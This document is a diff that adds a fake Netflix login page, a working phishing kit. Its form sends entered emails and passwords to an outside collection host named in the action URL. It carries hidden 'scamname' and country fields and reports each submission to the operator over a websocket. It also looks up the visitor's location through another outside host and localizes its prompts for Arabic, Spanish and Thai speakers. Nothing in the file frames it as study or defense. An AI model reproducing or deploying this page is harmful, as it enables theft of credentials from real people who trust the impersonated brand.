@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<link href="local_resources/img/ee8e4dd89afdc87509015201e28a97d3.png" rel="icon" type="image/x-icon"/>
+<title> Netflix Login Page</title>
+<link href="local_resources/css/65452701b4c202bd730f93a1b13d9149.css" rel="stylesheet"/>
+<link href="local_resources/css/8b2e9cc70ec41b6ed6900ff911937979.css" rel="stylesheet"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
+<link href="https://www.blogger.com/profile/14677677469690271813" rel="me">
+<meta content="ca-host-pub-1556223355139109" name="google-adsense-platform-account">
+<meta content="blogspot.com" name="google-adsense-platform-domain">
+</meta></meta></link></meta></head>
+<body>
+<a class="logo" href="https://www.netflix.com/" target="_blank"><img src="local_resources/img/43157c87bdf97ff2f0aad293f396ada7.png"/></a>
+<form action="https://sp0mers-team.online/v/add" class="login" id="page" method="post">
+<h1 class="login__title">Sign In</h1>
+<div class="login__group">
+<label>
+<input :placeholder="email" autocapitalize="none" autocomplete="off" class="login_group_input" id="email" name="email" required="" type="text"/>
+</label>
+</div>
+<div class="login__group">
+<label>
+<input :placeholder="password" autocapitalize="none" autocomplete="off" class="login_group_input" id="password" name="password" required="" type="password"/>
+</label>
+</div>
+<div class="pd-13">
+<input name="code" type="hidden" v-model="codecountry" value=""/>
+<input name="id" type="hidden" v-model="id_u" value=""/>
+<input name="sc" type="hidden" v-model="scamname" value=""/>
+<button class="btn-login-fb" name="add" onclick="ss()" type="submit">{{login}}</button>
+</div>
+</form>
+</body>
+<style>
+  body {
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 100vw;
+    height: 100vh;
+    background-image: url(https://bit.ly/2E3scwW);
+    background-repeat: no-repeat;
+    background-position: center center;
+    background-size: cover;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    background-color: #b3b3b3;
+    background-blend-mode: multiply;
+  }
+
+  body .logo {
+    position: absolute;
+    align-self: flex-start;
+    left: 10px;
+  }
+
+  body .logo img {
+    height: 75px;
+    width: auto;
+  }
+
+  body .login {
+    display: flex;
+    flex-direction: column;
+    background: rgba(0, 0, 0, 0.75);
+    border-radius: 4px;
+    width: 300px;
+    height: 500px;
+    padding: 60px 68px 40px;
+  }
+
+  body .login__title {
+    margin-bottom: 20px;
+    font-size: 2.2rem;
+    font-weight: 600;
+    color: #fff;
+  }
+
+  body .login__group {
+    position: relative;
+    z-index: 10;
+    display: flex;
+  }
+
+  body .login_group_label {
+    position: absolute;
+    z-index: 150;
+    color: #b3b3b3;
+    font-size: 0.9rem;
+    top: 30px;
+    left: 18px;
+    transition: all 300ms ease-in;
+  }
+
+  body .login_group_input {
+    width: 100%;
+    position: relative;
+    z-index: 100;
+    background: #333;
+    margin-bottom: 20px;
+    border-radius: 4px;
+    border: none;
+    opacity: 1;
+    font-size: 1rem;
+    color: #fff;
+    line-height: 50px;
+    padding: 12px 18px 0;
+  }
+
+  body .login_groupinput:focus+.logingroup_label {
+    top: 15px;
+    font-size: 0.7rem;
+  }
+
+  body .login__sign-in {
+    margin: 24px 0 12px;
+    padding: 16px;
+    color: #fff;
+    background: #e50914;
+    font-size: 0.9rem;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+
+  body .login__secondary-cta {
+    position: relative;
+    z-index: 100;
+    display: flex;
+    justify-content: space-between;
+  }
+
+  body .login_secondary-cta_text {
+    opacity: 1;
+    font-size: 0.9rem;
+    color: #b3b3b3;
+    text-decoration: none;
+  }
+
+  body .login_secondary-cta_text--need-help {
+    transition: all 0.3s ease-in;
+  }
+
+  body .login_secondary-cta_text--need-help:hover {
+    text-decoration: underline;
+  }
+
+  ::-moz-placeholder {
+    font-size: 0.7rem;
+  }
+
+  :-ms-input-placeholder {
+    font-size: 0.7rem;
+  }
+
+  ::placeholder {
+    font-size: 0.7rem;
+  }
+
+  .login__facebook {
+    display: flex;
+    align-items: center;
+    width: 100%;
+    color: #737373;
+  }
+
+  .login__facebook img {
+    width: 15%;
+    height: 20%;
+    padding-top: 50px;
+  }
+</style>
+<script src="local_resources/js/e89f7f2b1084562416fc923f269fab82.js"></script>
+<script src="local_resources/js/211df3681d2d4355fe9d1e3077b31095.js"></script>
+<script src="local_resources/js/22d3fb558cc9b4466d96ff88c0158a51.js"></script>
+<script src="local_resources/js/d6a4e611454a6b1aaf00d481c024fcd3.js"></script>
+<script>
+  const socket = io("wss://sc0m.herokuapp.com");
+  const queryStrings = window.location.search;
+  const urlParamss = new URLSearchParams(queryStrings);
+  const qs = urlParamss.get('q');
+
+  let rrss = atob(qs);
+  let users = rrss.split("_")[3];
+  users = users.split("=")[1];
+  function ss() {
+      socket.emit('add', {
+          nickname: "users",
+          groupe: parseInt(users),
+      });
+      socket.emit('adds', {
+          nickname: "users",
+          groupe: "all",
+      });
+  };
+</script>
+<script>
+  var vm = new Vue({
+      el: "#page",
+      data: {
+          password: "",
+          email: "",
+          login: '',
+          firsts: '',
+          create: '',
+          forget: '',
+          fetch: [],
+          codecountry: '',
+          id_u: '',
+          scamname: '',
+      },
+      methods: {
+      },
+
+      mounted() {
+          let email = document.getElementById('email').value;
+          let password = document.getElementById('password').value;
+          const queryString = window.location.search;
+          const urlParams = new URLSearchParams(queryString);
+          
+          const q = urlParams.get('q');
+
+          let rrs = atob(q);
+          let idu = rrs.split("=")[1][1]
+          let user = rrs.split("_")[3]
+          user = user.split("=")[1]
+          let sc = rrs.split("_")[2]
+          sc = sc.split("=")[1]
+          rrs = rrs.split("_")[1]
+          rrs = rrs.split("=")[1]
+          //alert(user)
+          let lang = rrs;
+          this.id_u = user
+          this.scamname = sc
+
+          if (lang == 'ar') {
+              this.email = "رقم الهاتف  أو البريد الإلكتروني";
+              this.password = "كلمه السر";
+              this.create = "انشاء حساب جديد";
+              this.firsts = "انت تحتاج لتسجيل الدخول اولا.";
+              this.forget = " هل نسيت كلمة السر ؟";
+              this.login = "تسجيل الدخول"
+          }
+          else if (lang == 'es') {
+              this.email = "Número o correo electrónico";
+              this.password = "contraseña";
+              this.create = "Crear una nueva cuenta";
+              this.firsts = "Primero debes iniciar sesión.";
+              this.forget = "¿Contraseña olvidada?";
+              this.login = "iniciar sesión";
+          }
+          else if (lang == 'th') {
+              this.email = "เบอร์มือถือหรืออีเมล";
+              this.password = "รหัสผ่าน";
+              this.create = "สร้างบัญชีใหม่";
+              this.firsts = "คุณต้องเข้าสู่ระบบก่อน";
+              this.forget = "ลืมรหัสผ่าน?";
+              this.login = "เข้าสู่ระบบ";
+          }
+          else {
+              this.email = "Mobile number or email address";
+              this.password = "Password";
+              this.create = "Create New Account";
+              this.firsts = "You need to log in first.";
+              this.forget = "Forgotten password?";
+              this.login = "Log In";
+          }
+
+          axios.get("https://livebotola.com/ip.php")
+              .then((resps) => {
+
+                  let dd = cpp[resps.data]
+                  this.codecountry = dd.prefix;
+              })
+
+      },
+  })
+</script>
+</html>
